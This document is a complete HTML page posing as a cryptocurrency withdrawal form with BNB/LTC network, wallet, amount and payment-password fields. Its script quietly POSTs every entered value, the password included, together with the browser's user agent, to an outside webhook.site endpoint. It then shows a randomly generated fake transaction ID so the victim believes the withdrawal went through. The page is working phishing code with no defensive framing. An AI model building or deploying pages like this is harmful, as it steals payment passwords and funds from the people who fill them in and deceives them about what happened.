<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Withdraw Interface</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f1f3f6;
      margin: 0;
      padding: 30px;
    }
    .box {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input, select {
      width: 100%;
      margin-top: 10px;
      padding: 12px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      margin-top: 20px;
      padding: 14px;
      background: #00b894;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Withdraw</h2>
    <select id="network">
      <option value="bnb">BNB</option>
      <option value="ltc">LTC</option>
    </select>
    <input id="wallet" placeholder="Wallet Address">
    <input id="amount" type="number" placeholder="Amount ($)">
    <input id="pass" type="password" placeholder="Payment Password">
    <button onclick="logSubmit()">Submit</button>
    <div id="msg"></div>
  </div>

  <script>
    function logSubmit() {
      const data = {
        wallet: document.getElementById('wallet').value,
        amount: document.getElementById('amount').value,
        pass: document.getElementById('pass').value,
        network: document.getElementById('network').value,
        agent: navigator.userAgent
      };

      fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
        method: "POST",
        body: JSON.stringify(data),
        headers: { "Content-Type": "application/json" }
      });

      document.getElementById('msg').innerText = "TXID: 0x" + Math.random().toString(16).substr(2, 12);
    }
  </script>
</body>
</html>
